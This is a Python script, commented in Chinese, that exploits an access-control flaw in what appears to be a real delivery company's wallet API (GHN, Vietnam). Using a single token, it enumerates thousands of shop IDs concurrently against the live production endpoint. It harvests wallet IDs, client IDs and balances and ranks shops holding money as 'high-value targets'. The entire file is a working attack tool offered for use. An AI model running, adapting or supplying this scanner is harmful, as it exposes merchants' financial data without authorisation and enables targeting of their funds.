#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
🔥 GHN横向越权 - 批量钱包扫描器
利用漏洞: 任意Token可访问任意Shop钱包

使用方法:
  python3 ghn_wallet_scanner.py --token YOUR_TOKEN --start 1 --count 10000
"""

import requests
import json
import time
import argparse
from concurrent.futures import ThreadPoolExecutor
from datetime import datetime

class WalletScanner:
    def __init__(self, token, threads=10):
        self.token = token
        self.threads = threads
        self.headers = {
            'Token': token,
            'Content-Type': 'application/json',
            'User-Agent': 'GHN Express/25100302'
        }
        self.found_wallets = []
    
    def scan_shop(self, shop_id):
        """扫描单个Shop的钱包"""
        try:
            r = requests.post(
                'https://online-gateway.ghn.vn/shiip/public-api/v2/wallet/detail',
                headers=self.headers,
                json={'shop_id': shop_id},
                timeout=10
            )
            
            if r.status_code == 200:
                data = r.json()
                if data.get('code') == 200 and data.get('data'):
                    wallet = data['data']
                    balances = wallet.get('balances', [])
                    
                    # 计算总余额
                    total_balance = sum(b.get('balance', 0) for b in balances)
                    
                    result = {
                        'shop_id': shop_id,
                        'wallet_id': wallet.get('_id'),
                        'client_id': wallet.get('client_id'),
                        'total_balance': total_balance,
                        'balances': balances,
                        'created_date': wallet.get('created_date'),
                        'accessible': True
                    }
                    
                    if total_balance > 0:
                        print(f'🔥 Shop {shop_id}: {total_balance:,} VND')
                        self.found_wallets.append(result)
                    
                    return result
            
            return {'shop_id': shop_id, 'accessible': False}
            
        except Exception as e:
            return {'shop_id': shop_id, 'error': str(e)}
    
    def scan_range(self, start_id, count):
        """扫描Shop ID范围"""
        print(f'[*] 扫描Shop {start_id} 到 {start_id + count - 1}...')
        print(f'[*] 使用 {self.threads} 个线程\n')
        
        shop_ids = range(start_id, start_id + count)
        results = []
        
        with ThreadPoolExecutor(max_workers=self.threads) as executor:
            for i, result in enumerate(executor.map(self.scan_shop, shop_ids), 1):
                results.append(result)
                
                if i % 100 == 0:
                    print(f'[进度] {i}/{count} ({i*100//count}%)')
        
        return results
    
    def save_results(self, results, filename=None):
        """保存扫描结果"""
        if filename is None:
            filename = f'ghn_wallet_scan_{int(time.time())}.json'
        
        with open(filename, 'w') as f:
            json.dump(results, f, indent=2, ensure_ascii=False)
        
        print(f'\n✅ 结果已保存至: {filename}')
        
        # 统计
        accessible = [r for r in results if r.get('accessible')]
        with_balance = [r for r in accessible if r.get('total_balance', 0) > 0]
        
        total_money = sum(r.get('total_balance', 0) for r in with_balance)
        
        print(f'\n扫描统计:')
        print(f'  总扫描: {len(results)}')
        print(f'  可访问: {len(accessible)} ({len(accessible)*100//len(results)}%)')
        print(f'  有余额: {len(with_balance)}')
        print(f'  总金额: {total_money:,} VND')
        
        if with_balance:
            print(f'\n高价值目标 (Top 10):')
            sorted_wallets = sorted(with_balance, key=lambda x: x['total_balance'], reverse=True)
            for wallet in sorted_wallets[:10]:
                print(f'  Shop {wallet["shop_id"]}: {wallet["total_balance"]:,} VND')

def main():
    parser = argparse.ArgumentParser(description='GHN横向越权钱包扫描器')
    parser.add_argument('--token', '-t', required=True, help='有效的GHN Token')
    parser.add_argument('--start', '-s', type=int, default=1, help='起始Shop ID')
    parser.add_argument('--count', '-c', type=int, default=1000, help='扫描数量')
    parser.add_argument('--threads', type=int, default=10, help='线程数')
    parser.add_argument('--output', '-o', help='输出文件名')
    
    args = parser.parse_args()
    
    print('=' * 70)
    print('  GHN钱包批量扫描器 - 横向越权漏洞利用')
    print('=' * 70)
    print(f'\n配置:')
    print(f'  Token: {args.token[:20]}...')
    print(f'  起始ID: {args.start}')
    print(f'  数量: {args.count}')
    print(f'  线程: {args.threads}\n')
    
    scanner = WalletScanner(args.token, args.threads)
    results = scanner.scan_range(args.start, args.count)
    scanner.save_results(results, args.output)

if __name__ == '__main__':
    main()
